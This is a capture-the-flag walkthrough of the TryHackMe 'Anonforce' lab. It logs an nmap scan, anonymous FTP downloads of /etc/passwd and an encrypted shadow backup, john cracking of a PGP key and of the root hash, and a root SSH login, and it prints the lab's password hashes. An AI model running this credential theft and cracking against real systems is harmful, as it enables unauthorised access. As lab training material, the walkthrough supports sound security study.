# Room
https://tryhackme.com/room/bsidesgtanonforce

# Task 1
* Enumeration - nmap
    ```
    nmap -A -T4 10.10.58.123

    Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-29 12:19 EST
    Nmap scan report for 10.10.58.123
    Host is up (0.13s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
    | drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
    | drwxr-xr-x   17 0        0            3700 Jan 29 09:18 dev
    | drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
    | drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
    | lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
    | lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
    | drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
    | drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
    | drwx------    2 0        0           16384 Aug 11  2019 lost+found
    | drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
    | drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
    | drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
    | drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
    | dr-xr-xr-x  102 0        0               0 Jan 29 09:18 proc
    | drwx------    3 0        0            4096 Aug 11  2019 root
    | drwxr-xr-x   18 0        0             540 Jan 29 09:18 run
    | drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
    | drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
    | dr-xr-xr-x   13 0        0               0 Jan 29 09:18 sys
    |_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.14.4.14
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 1
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
    |   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
    |_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 15.65 seconds    
    ```
* Enumeration - nmap review
    * Anonymous FTP is allowed, we'll connect to the box with that and see what we find
* Gaining access - FTP
    ```
    ftp 10.10.58.123
    Connected to 10.10.58.123.
    220 (vsFTPd 3.0.3)
    Name (10.10.58.123): anonymous
    331 Please specify the password.
    Password:
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls -lrta
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
    drwx------    2 0        0           16384 Aug 11  2019 lost+found
    drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
    drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
    drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
    drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
    drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
    drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
    drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
    drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
    drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
    lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
    lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
    lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
    lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
    drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
    drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
    drwx------    3 0        0            4096 Aug 11  2019 root
    drwxr-xr-x   23 0        0            4096 Aug 11  2019 .
    drwxr-xr-x   23 0        0            4096 Aug 11  2019 ..
    drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
    drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
    dr-xr-xr-x   99 0        0               0 Jan 29 09:18 proc
    dr-xr-xr-x   13 0        0               0 Jan 29 09:18 sys
    drwxrwxrwt    9 0        0            4096 Jan 29 09:18 tmp
    drwxr-xr-x   17 0        0            3700 Jan 29 09:18 dev
    drwxr-xr-x   18 0        0             540 Jan 29 09:18 run
    226 Directory send OK.
    ```
* Gaining access - FTP - User found
    ```
    ftp> cd /home
    250 Directory successfully changed.     
    ftp> ls -lrta
    200 PORT command successful. Consider using PASV.        
    150 Here comes the directory listing.        
    drwxr-xr-x    3 0        0            4096 Aug 11  2019 .  
    drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias  
    drwxr-xr-x   23 0        0            4096 Aug 11  2019 ..              
    226 Directory send OK.                 
    ftp> cd melodias     
    250 Directory successfully changed.   
    ftp> ls -lrta    
    200 PORT command successful. Consider using PASV.   
    150 Here comes the directory listing.  
    -rw-r--r--    1 1000     1000          655 Aug 11  2019 .profile   
    -rw-r--r--    1 1000     1000         3771 Aug 11  2019 .bashrc  
    -rw-r--r--    1 1000     1000          220 Aug 11  2019 .bash_logout 
    drwxr-xr-x    3 0        0            4096 Aug 11  2019 ..       
    drwx------    2 1000     1000         4096 Aug 11  2019 .cache     
    -rw-r--r--    1 1000     1000            0 Aug 11  2019 .sudo_as_admin_successful 
    drwxrwxr-x    2 1000     1000         4096 Aug 11  2019 .nano    
    -rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt   
    drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 .    
    -rw-r--r--    1 0        0             183 Aug 11  2019 .wget-hsts  
    -rw-------    1 0        0             117 Aug 11  2019 .bash_history  
    226 Directory send OK.
    ftp> get user.txt
    local: user.txt remote: user.txt
    200 PORT command successful. Consider using PASV.
    150 Opening BINARY mode data connection for user.txt (33 bytes).
    226 Transfer complete.
    33 bytes received in 0.00 secs (332.2326 kB/s)
    ```
* Gaining access - FTP - Backups found
    ```
    ftp> cd notread
    250 Directory successfully changed.
    ftp> ls
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    -rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
    -rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
    226 Directory send OK.
    ftp> get backup.pgp
    local: backup.pgp remote: backup.pgp
    200 PORT command successful. Consider using PASV.
    150 Opening BINARY mode data connection for backup.pgp (524 bytes).
    226 Transfer complete.
    524 bytes received in 0.00 secs (5.2603 MB/s)
    ftp> get private.asc
    local: private.asc remote: private.asc
    200 PORT command successful. Consider using PASV.
    150 Opening BINARY mode data connection for private.asc (3762 bytes).
    226 Transfer complete.
    3762 bytes received in 0.00 secs (1.6435 MB/s)

    Also download /etc/passwd
    ```
* Gaining access - FTP review
    * After gaining access with anonymous FTP we discovered an interesting directory /notread that contained a PGP backup.  We were also able to grab the user.txt and the /etc/passwd
* Cracking - Crack the PGP private key
    ```
    file backup.pgp
    backup.pgp: data

    file private.asc
    private.asc: PGP private key block

    gpg2john private.asc > k.hash
    File private.asc

    cat k.hash
    anonforce:$gpg$*17*54*2048*e419ac715ed55197122fd0acc6477832266db83b63a3f0d16b7f5fb3db2b93a6a995013bb1e7aff697e782d505891ee260e957136577*3*254*2*9*16*5d044d82578ecc62baaa15c1bcf1cfdd*65536*d7d11d9bf6d08968:::anonforce <melodias@anonforce.nsa>::private.asc

    john --wordlist=/usr/share/wordlists/rockyou.txt k.hash 
    Using default input encoding: UTF-8
    Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
    Cost 1 (s2k-count) is 65536 for all loaded hashes
    Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
    Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
    Will run 2 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    [removed]          (anonforce)
    1g 0:00:00:00 DONE (2021-01-29 12:38) 3.571g/s 3321p/s 3321c/s 3321C/s xbox360..sheena
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    ```
* Extract backup with cracked creds
    ```
    gpg --import private.asc
    gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
    gpg: key B92CD1F280AD82C2: secret key imported
    gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
    gpg: Total number processed: 2
    gpg:              unchanged: 2
    gpg:       secret keys read: 1
    gpg:   secret keys imported: 1

    gpg --decrypt backup.pgp
    gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
    gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
        "anonforce <melodias@anonforce.nsa>"
    root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
    daemon:*:17953:0:99999:7:::
    bin:*:17953:0:99999:7:::
    sys:*:17953:0:99999:7:::
    sync:*:17953:0:99999:7:::
    games:*:17953:0:99999:7:::
    man:*:17953:0:99999:7:::
    lp:*:17953:0:99999:7:::
    mail:*:17953:0:99999:7:::
    news:*:17953:0:99999:7:::
    uucp:*:17953:0:99999:7:::
    proxy:*:17953:0:99999:7:::
    www-data:*:17953:0:99999:7:::
    backup:*:17953:0:99999:7:::
    list:*:17953:0:99999:7:::
    irc:*:17953:0:99999:7:::
    gnats:*:17953:0:99999:7:::
    nobody:*:17953:0:99999:7:::
    systemd-timesync:*:17953:0:99999:7:::
    systemd-network:*:17953:0:99999:7:::
    systemd-resolve:*:17953:0:99999:7:::
    systemd-bus-proxy:*:17953:0:99999:7:::
    syslog:*:17953:0:99999:7:::
    _apt:*:17953:0:99999:7:::
    messagebus:*:18120:0:99999:7:::
    uuidd:*:18120:0:99999:7:::
    melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
    sshd:*:18120:0:99999:7:::
    ftp:*:18120:0:99999:7:::
    ```
* Cracking - Crack the root hash
    ```
    Copy above to shadow

    unshadow passwd shadow > unshadowed

    john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed 
    Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"
    Use the "--format=md5crypt" option to force loading hashes of that type instead
    Using default input encoding: UTF-8
    Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
    Cost 1 (iteration count) is 5000 for all loaded hashes
    Will run 2 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    [removed]           (root)
    1g 0:00:00:10 DONE (2021-01-29 12:46) 0.09920g/s 673.0p/s 673.0c/s 673.0C/s 98765432..random1
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    ```
* Gaining Access - SSH
    ```
    SSH to the box with the cracked root user

    ssh root@10.10.58.123
    The authenticity of host '10.10.58.123 (10.10.58.123)' can't be established.
    ECDSA key fingerprint is SHA256:5evbK4JjQatGFwpn/RYHt5C3A6banBkqnngz4IVXyz0.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '10.10.58.123' (ECDSA) to the list of known hosts.
    root@10.10.58.123's password: 
    Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage

    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.

    root@ubuntu:~# 

    root@ubuntu:~# ls -lrta
    total 28
    -rw-r--r--  1 root root  148 Aug 17  2015 .profile
    -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
    drwxr-xr-x  2 root root 4096 Aug 11  2019 .nano
    -rw-r--r--  1 root root   33 Aug 11  2019 root.txt
    drwxr-xr-x 23 root root 4096 Aug 11  2019 ..
    drwx------  2 root root 4096 Jan 29 11:13 .cache
    drwx------  4 root root 4096 Jan 29 11:13 .
    root@ubuntu:~# cat root.txt
    [removed]
    ```
# Review
With our initial scan we found anonymous FTP open for anyone to connect.  After connecting, we were able to grab an encrypted backup of the /etc/shadow file, PGP private key, user.txt, and /etc/passwd.  Using john we cracked the PGP pass phrase to allow us to apply it to the backup for decryption.  Once we had the shadow file backup we used unshadow and john again to crack the root user credentials.  With the root user's credentials we were able to login to the box with full permissions.